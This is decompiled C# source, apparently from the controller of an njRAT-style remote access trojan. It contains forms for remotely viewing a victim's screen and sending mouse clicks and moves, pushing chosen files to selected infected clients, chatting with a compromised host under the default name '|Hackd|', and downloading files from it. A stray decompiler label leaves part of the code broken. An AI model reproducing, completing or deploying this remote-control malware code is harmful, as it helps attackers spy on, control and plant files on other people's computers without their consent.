			bool flag = this.CheckBox2.Checked;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round(Math.Round(unchecked((double)e.X * ((double)this.Sz.Width / (double)this.P1.Width)))), (int)Math.Round(Math.Round(unchecked((double)e.Y * ((double)this.Sz.Height / (double)this.P1.Height))))));
				flag = (e.Button == MouseButtons.Left);
				int value;
				if (flag)
				{
					value = 4;
				}
				flag = (e.Button == MouseButtons.Right);
				if (flag)
				{
					value = 16;
				}
				this.F.Send(string.Concat(new string[]
				{
					"EnviarClickMauser",
					sokserver.Y,
					Conversions.ToString(point.X),
					sokserver.Y,
					Conversions.ToString(point.Y),
					sokserver.Y,
					Conversions.ToString(value)
				}));
			}
		}

		public void PktToImage(byte[] BY)
		{
			bool flag = Operators.CompareString(this.btnIniciar.Text, "Stop", false) == 0;
			if (flag)
			{
				this.F.Send(string.Concat(new string[]
				{
					"Meu@",
					sokserver.Y,
					Conversions.ToString(this.C1.SelectedIndex),
					sokserver.Y,
					this.C2.Text,
					sokserver.Y,
					Conversions.ToString(this.C.Value)
				}));
			}
			Point right;
			flag = (this.op != right && Operators.CompareString(this.btnIniciar.Text, "Stop", false) == 0);
			if (flag)
			{
				Point point = new Point(0, 0);
				point.X = this.op.X;
				point.Y = this.op.Y;
				this.op = default(Point);
				this.F.Send(string.Concat(new string[]
				{
					"EnviarMauserMove",
					sokserver.Y,
					Conversions.ToString(point.X),
					sokserver.Y,
					Conversions.ToString(point.Y),
					sokserver.Y
				}));
			}
			Array instance = this.fx(BY, "njq8");
			MemoryStream stream = new MemoryStream((byte[])NewLateBinding.LateIndexGet(instance, new object[]
			{
				1
			}, null));
			Bitmap bitmap = (Bitmap)Image.FromStream(stream);
			string[] array = Strings.Split(this.BS((byte[])NewLateBinding.LateIndexGet(instance, new object[]
			{
				0
			}, null)), ",", -1, CompareMethod.Binary);
			IntPtr callbackData;
			Bitmap image = (Bitmap)this.P1.Image.GetThumbnailImage(Conversions.ToInteger(Strings.Split(array[0], ".", -1, CompareMethod.Binary)[0]), Conversions.ToInteger(Strings.Split(array[0], ".", -1, CompareMethod.Binary)[1]), null, callbackData);
			Graphics graphics = Graphics.FromImage(image);
			int num = 0;
			checked
			{
				int num2 = array.Length - 2;
				for (int i = 1; i <= num2; i++)
				{
					Point point2 = new Point(Conversions.ToInteger(Strings.Split(array[i], ".", -1, CompareMethod.Binary)[0]), Conversions.ToInteger(Strings.Split(array[i], ".", -1, CompareMethod.Binary)[1]));
					Size size = new Size(bitmap.Width, Conversions.ToInteger(Strings.Split(array[i], ".", -1, CompareMethod.Binary)[2]));
					Rectangle rect = new Rectangle(0, num, bitmap.Width, Conversions.ToInteger(Strings.Split(array[i], ".", -1, CompareMethod.Binary)[2]));
					Point point3 = new Point(Conversions.ToInteger(Strings.Split(array[i], ".", -1, CompareMethod.Binary)[0]), Conversions.ToInteger(Strings.Split(array[i], ".", -1, CompareMethod.Binary)[1]));
					graphics.DrawImage(bitmap.Clone(rect, bitmap.PixelFormat), point3);
					flag = this.CheckBox1.Checked;
					if (flag)
					{
						Rectangle rect2 = new Rectangle(Conversions.ToInteger(Strings.Split(array[i], ".", -1, CompareMethod.Binary)[0]), Conversions.ToInteger(Strings.Split(array[i], ".", -1, CompareMethod.Binary)[1]), size.Width, size.Height);
						graphics.DrawRectangle(Pens.Red, rect2);
					}
					num += size.Height;
				}
				graphics.Dispose();
				this.P1.Image = image;
			}
		}

		public Size QZ(int q)
		{
			Size size = new Size((Point)this.Sz);
			checked
			{
				Size result;
				switch (q)
				{
				case 0:
					result = this.Sz;
					return result;
				case 1:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 1.1));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 1.1));
					break;
				case 2:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 1.3));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 1.3));
					break;
				case 3:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 1.5));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 1.5));
					break;
				case 4:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 1.9));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 1.9));
					break;
				case 5:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 2.0));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 2.0));
					break;
				case 6:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 2.1));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 2.1));
					break;
				case 7:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 2.2));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 2.2));
					break;
				case 8:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 2.5));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 2.5));
					break;
				case 9:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 3.0));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 3.0));
					break;
				case 10:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 3.5));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 3.5));
					break;
				case 11:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 4.0));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 4.0));
					break;
				case 12:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 5.0));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 5.0));
					break;
				case 13:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 6.0));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 6.0));
					break;
				}
				size.Width = Conversions.ToInteger(Strings.Mid(size.Width.ToString(), 1, size.Width.ToString().Length - 1) + Conversions.ToString(0));
				size.Height = Conversions.ToInteger(Strings.Mid(size.Height.ToString(), 1, size.Height.ToString().Length - 1) + Conversions.ToString(0));
				result = size;
				return result;
			}
		}

		public string SetBytes(object Bytes)
		{
			bool flag;
			string result;
			int num2;
			try
			{
				ProjectData.ClearProjectError();
				int num = 2;
				flag = Operators.ConditionalCompareObjectGreaterEqual(RuntimeHelpers.GetObjectValue(Bytes), 1073741824, false);
				if (flag)
				{
					result = Strings.Format(RuntimeHelpers.GetObjectValue(Operators.DivideObject(RuntimeHelpers.GetObjectValue(Operators.DivideObject(RuntimeHelpers.GetObjectValue(Operators.DivideObject(RuntimeHelpers.GetObjectValue(Bytes), 1024)), 1024)), 1024)), "#0.00") + " GB";
				}
				else
				{
					flag = Operators.ConditionalCompareObjectGreaterEqual(RuntimeHelpers.GetObjectValue(Bytes), 1048576, false);
					if (flag)
					{
						result = Strings.Format(RuntimeHelpers.GetObjectValue(Operators.DivideObject(RuntimeHelpers.GetObjectValue(Operators.DivideObject(RuntimeHelpers.GetObjectValue(Bytes), 1024)), 1024)), "#0.00") + " MB";
					}
					else
					{
						flag = Operators.ConditionalCompareObjectGreaterEqual(RuntimeHelpers.GetObjectValue(Bytes), 1024, false);
						if (flag)
						{
							result = Strings.Format(RuntimeHelpers.GetObjectValue(Operators.DivideObject(RuntimeHelpers.GetObjectValue(Bytes), 1024)), "#0.00") + " KB";
						}
						else
						{
							flag = Operators.ConditionalCompareObjectLess(RuntimeHelpers.GetObjectValue(Bytes), 1024, false);
							if (flag)
							{
								result = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Conversion.Fix(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Bytes))))), " Bytes")));
							}
						}
					}
				}
				goto IL_1E4;
				IL_18E:
				num2 = -1;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_1AA:
				goto IL_1D7;
				IL_1B0:
				result = "0 Bytes";
				goto IL_1E4;
			}
			catch (Exception expr_1B6)
			{
				ProjectData.SetProjectError(expr_1B6);
				Exception projectError = expr_1B6;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				goto IL_18E;
			}
			IL_1D7:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_1E4:
			flag = (num2 != 0);
			if (flag)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.FileName = "";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				bool flag2 = true;
				string text = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag2));
				byte[] array = FN.SB(ref text);
				MemoryStream memoryStream = new MemoryStream();
				string text2 = "rn" + sokserver.Y + new FileInfo(openFileDialog.FileName).Extension + sokserver.Y;
				memoryStream.Write(FN.SB(ref text2), 0, text2.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(sokserver.SendTo), 1);
				thread.Start(new object[]
				{
					MyProject.Forms.Frm_Main.L1V.SelectedItems,
					memoryStream.ToArray(),
					Color.Green
				});
			}
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.ProgressBar1.Value == 100;
			if (flag)
			{
				this.ProgressBar1.Value = 0;
			}
			else
			{
				this.ProgressBar1.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar1.Value) + Conversion.Val(10))));
			}
		}

		private void Button2_Click(object sender, EventArgs e)
		{
		}

		private void Timer2_Tick(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.btnIniciar.Text, "Start", false) == 0;
			if (flag)
			{
				this.F.Send(string.Concat(new string[]
				{
					"Meu@",
					sokserver.Y,
					Conversions.ToString(this.C1.SelectedIndex),
					sokserver.Y,
					this.C2.Text,
					sokserver.Y,
					Conversions.ToString(this.C.Value)
				}));
				this.btnIniciar.Text = "Stop";
			}
			else
			{
				this.btnIniciar.Text = "Start";
			}
		}

		private void Panel1_Paint(object sender, PaintEventArgs e)
		{
			this.Panel1.Enabled = true;
		}

		private void P1_MouseEnter(object sender, EventArgs e)
		{
			this.IsActive = true;
		}

		private void P1_MouseLeave(object sender, EventArgs e)
		{
			this.IsActive = false;
		}

		private void P1_MouseMove1(object sender, MouseEventArgs e)
		{
			this.point_2 = e.Location;
			bool flag = this.point_2.Y < 20;
			if (flag)
			{
				this.Panel1.Visible = true;
			}
			else
			{
				this.Panel1.Visible = false;
			}
			PictureBox p = this.P1;
			PictureBox obj = p;
			lock (obj)
			{
				flag = ((!this.P1.Focused & this.CheckBox2.Checked) | this.CheckBox1.Checked);
				if (flag)
				{
					this.P1.Focus();
				}
			}
		}

		private void Button2_Click_1(object sender, EventArgs e)
		{
		}

		private void CheckBox3_CheckedChanged(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.FileName = "";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				bool flag2 = true;
				string text = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag2));
				byte[] array = FN.SB(ref text);
				MemoryStream memoryStream = new MemoryStream();
				string text2 = "rn" + sokserver.Y + new FileInfo(openFileDialog.FileName).Extension + sokserver.Y;
				memoryStream.Write(FN.SB(ref text2), 0, text2.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(sokserver.SendTo), 1);
				thread.Start(new object[]
				{
					MyProject.Forms.Frm_Main.L1V.SelectedItems,
					memoryStream.ToArray(),
					Color.Green
				});
			}
		}

		private void CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Chat : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		[AccessedThroughProperty("T2")]
		private TextBox _T2;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("Timer2")]
		private Timer _Timer2;

		public string hk;

		public Client osk;

		public Client sk;

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		internal virtual TextBox T2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T2 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click_1);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				bool flag = this._Timer2 != null;
				if (flag)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				flag = (this._Timer2 != null);
				if (flag)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Chat.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Chat.__ENCList.Count == Frm_Chat.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Chat.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Chat.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Chat.__ENCList[num] = Frm_Chat.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Chat.__ENCList.RemoveRange(num, Frm_Chat.__ENCList.Count - num);
						Frm_Chat.__ENCList.Capacity = Frm_Chat.__ENCList.Count;
					}
					Frm_Chat.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_Chat));
			this.Timer1 = new Timer(this.components);
			this.Panel1 = new Panel();
			this.T2 = new TextBox();
			this.Button1 = new Button();
			this.T1 = new RichTextBox();
			this.ProgressBar1 = new ProgressBar();
			this.Timer2 = new Timer(this.components);
			this.Panel1.SuspendLayout();
			this.SuspendLayout();
			this.Panel1.Controls.Add(this.T2);
			this.Panel1.Controls.Add(this.Button1);
			this.Panel1.Dock = DockStyle.Bottom;
			Control arg_DF_0 = this.Panel1;
			Point location = new Point(0, 143);
			arg_DF_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_10D_0 = this.Panel1;
			Size size = new Size(479, 36);
			arg_10D_0.Size = size;
			this.Panel1.TabIndex = 1;
			this.T2.BackColor = Color.Black;
			this.T2.BorderStyle = BorderStyle.FixedSingle;
			this.T2.Dock = DockStyle.Fill;
			this.T2.Font = new Font("Segoe UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.T2.ForeColor = Color.Lime;
			Control arg_18B_0 = this.T2;
			location = new Point(0, 0);
			arg_18B_0.Location = location;
			this.T2.Multiline = true;
			this.T2.Name = "T2";
			Control arg_1C6_0 = this.T2;
			size = new Size(394, 36);
			arg_1C6_0.Size = size;
			this.T2.TabIndex = 3;
			this.Button1.BackColor = Color.Black;
			this.Button1.Cursor = Cursors.Hand;
			this.Button1.Dock = DockStyle.Right;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_23B_0 = this.Button1;
			location = new Point(394, 0);
			arg_23B_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_266_0 = this.Button1;
			size = new Size(85, 36);
			arg_266_0.Size = size;
			this.Button1.TabIndex = 2;
			this.Button1.Text = "Send";
			this.Button1.UseVisualStyleBackColor = false;
			this.T1.BackColor = Color.Black;
			this.T1.Dock = DockStyle.Fill;
			this.T1.ForeColor = Color.Lime;
			Control arg_2D7_0 = this.T1;
			location = new Point(0, 0);
			arg_2D7_0.Location = location;
			this.T1.Name = "T1";
			Control arg_308_0 = this.T1;
			size = new Size(479, 143);
			arg_308_0.Size = size;
			this.T1.TabIndex = 2;
			this.T1.Text = "";
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_34E_0 = this.ProgressBar1;
			location = new Point(0, 133);
			arg_34E_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_37C_0 = this.ProgressBar1;
			size = new Size(479, 10);
			arg_37C_0.Size = size;
			this.ProgressBar1.TabIndex = 106;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(479, 179);
			this.ClientSize = size;
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.T1);
			this.Controls.Add(this.Panel1);
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Frm_Chat";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Chat";
			this.TransparencyKey = Color.Fuchsia;
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			this.ResumeLayout(false);
		}

		public Frm_Chat()
		{
			base.FormClosing += new FormClosingEventHandler(this.chat_FormClosing);
			base.Load += new EventHandler(this.chat_Load);
			Frm_Chat.__ENCAddToList(this);
			base.FormClosing += new FormClosingEventHandler(this.chat_FormClosing);
			base.Load += new EventHandler(this.chat_Load);
			this.hk = "|Hackd|";
			this.InitializeComponent();
		}

		private void chat_Load(object sender, EventArgs e)
		{
			this.Timer2.Start();
			this.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(sokserver.vno(this.osk.L)));
			this.Show();
			string left = Interaction.InputBox("Enter Your NickName", "Chat", this.hk, -1, -1);
			bool flag = Operators.CompareString(left, "", false) == 0;
			if (flag)
			{
				this.sk.CN = false;
			}
			else
			{
				this.hk = left;
				this.sk.Send("~" + sokserver.Y + FN.ENB(ref this.hk));
			}
			this.Timer1.Enabled = true;
			this.T2.Select();
			this.T2.Focus();
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.sk == null | this.osk == null;
			if (flag)
			{
				bool flag2 = this.T2.Enabled | Operators.CompareString(this.T1.Text, "", false) == 0;
				if (flag2)
				{
					this.T1.AppendText("Disconnected ...");
				}
				this.T2.Enabled = false;
				this.Button1.Enabled = false;
				this.sk.Send("@");
				this.sk.CN = false;
				this.Close();
			}
			else
			{
				bool flag2 = !this.sk.CN | !this.osk.CN;
				if (flag2)
				{
					flag = (this.T2.Enabled | Operators.CompareString(this.T1.Text, "", false) == 0);
					if (flag)
					{
						this.T1.AppendText("Disconnected ...");
					}
					this.T2.Enabled = false;
					this.Button1.Enabled = false;
					this.sk.Send("@");
					this.sk.CN = false;
					this.Close();
				}
			}
		}

		private void T2_KeyDown(object sender, KeyEventArgs e)
		{
			bool flag = e.KeyCode == Keys.Return;
			if (flag)
			{
				e.SuppressKeyPress = true;
				flag = (Operators.CompareString(this.T2.Text, "", false) != 0);
				if (flag)
				{
					lock (this)
					{
						this.T1.SelectionStart = this.T1.TextLength;
						this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
						this.T1.AppendText("[" + this.hk + "] ");
						this.T1.SelectionFont = this.T1.Font;
						this.T1.AppendText(this.T2.Text + "\r\n");
						this.T1.SelectionStart = this.T1.TextLength;
						this.T1.ScrollToCaret();
						TextBox t = this.T2;
						string text = t.Text;
						t.Text = text;
						this.sk.Send("!" + sokserver.Y + FN.ENB(ref text));
						this.T2.Text = "";
					}
				}
			}
			else
			{
				this.T2.Select();
			}
		}

		private void T1_LinkClicked(object sender, LinkClickedEventArgs e)
		{
			try
			{
				Process.Start(e.LinkText);
			}
			catch (Exception expr_10)
			{
				ProjectData.SetProjectError(expr_10);
				Exception projectError = expr_10;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void chat_FormClosing(object sender, FormClosingEventArgs e)
		{
			bool cN = this.sk.CN;
			if (cN)
			{
				this.sk.Send("@");
			}
			this.sk.CN = false;
		}

		private void Button1_Click(object sender, EventArgs e)
		{
		}

		private void NyX_Theme1_Click(object sender, EventArgs e)
		{
		}

		private void NyX_Button1_Click(object sender, EventArgs e)
		{
			bool cN = this.sk.CN;
			if (cN)
			{
				this.sk.Send("@");
			}
			this.sk.CN = false;
			this.Close();
		}

		private void Button1_Click_1(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.T2.Text, "", false) != 0;
			if (flag)
			{
				lock (this)
				{
					this.T1.SelectionStart = this.T1.TextLength;
					this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
					this.T1.AppendText("[" + this.hk + "] ");
					this.T1.SelectionFont = this.T1.Font;
					this.T1.AppendText(this.T2.Text + "\r\n");
					this.T1.SelectionStart = this.T1.TextLength;
					this.T1.ScrollToCaret();
					TextBox t = this.T2;
					string text = t.Text;
					t.Text = text;
					this.sk.Send("!" + sokserver.Y + FN.ENB(ref text));
					this.T2.Text = "";
				}
			}
		}

		private void Timer2_Tick(object sender, EventArgs e)
		{
			bool flag = this.ProgressBar1.Value == 100;
			if (flag)
			{
				this.ProgressBar1.Value = 0;
			}
			else
			{
				this.ProgressBar1.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar1.Value) + Conversion.Val(10))));
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Dowload : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("GroupBox1")]
		private GroupBox _GroupBox1;

		[AccessedThroughProperty("Lv1")]
		private LV _Lv1;

		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		public Client c;

		public string FNNNN;

		public string folder;

		public FileStream FS;

		public int os;

		public Client osk;

		public int SZ;

		public string tmp;

		internal virtual GroupBox GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GroupBox1_Enter);
				bool flag = this._GroupBox1 != null;
				if (flag)
				{
					this._GroupBox1.Enter -= value2;
				}
				this._GroupBox1 = value;
				flag = (this._GroupBox1 != null);
				if (flag)
				{
					this._GroupBox1.Enter += value2;
				}
			}
		}

		internal virtual LV Lv1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lv1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Lv1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Dowload.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Dowload.__ENCList.Count == Frm_Dowload.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Dowload.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Dowload.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Dowload.__ENCList[num] = Frm_Dowload.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Dowload.__ENCList.RemoveRange(num, Frm_Dowload.__ENCList.Count - num);
						Frm_Dowload.__ENCList.Capacity = Frm_Dowload.__ENCList.Count;
					}
					Frm_Dowload.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ListViewItem listViewItem = new ListViewItem(new string[]
			{
				"File Name",
				""
			}, -1);
			ListViewItem listViewItem2 = new ListViewItem(new string[]
			{
				"File Size",
				""
			}, -1);
			ListViewItem listViewItem3 = new ListViewItem(new string[]
			{
				"Speed",
				""
			}, -1);
			ListViewItem listViewItem4 = new ListViewItem(new string[]
			{
				"Downloaded",
				""
			}, -1);
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_Dowload));
			this.GroupBox1 = new GroupBox();
			this.Lv1 = new LV();
			this.ColumnHeader1 = new ColumnHeader();
			this.ColumnHeader2 = new ColumnHeader();
			this.Button1 = new Button();
			this.Timer1 = new Timer(this.components);
			this.ProgressBar1 = new ProgressBar();
			this.GroupBox1.SuspendLayout();
			this.SuspendLayout();
			this.GroupBox1.BackColor = Color.FromArgb(28, 28, 28);
			this.GroupBox1.Controls.Add(this.Lv1);
			this.GroupBox1.ForeColor = SystemColors.ControlLightLight;
			Control arg_16F_0 = this.GroupBox1;
			Point location = new Point(2, 0);
			arg_16F_0.Location = location;
			this.GroupBox1.Name = "GroupBox1";
			Control arg_19D_0 = this.GroupBox1;
			Size size = new Size(475, 93);
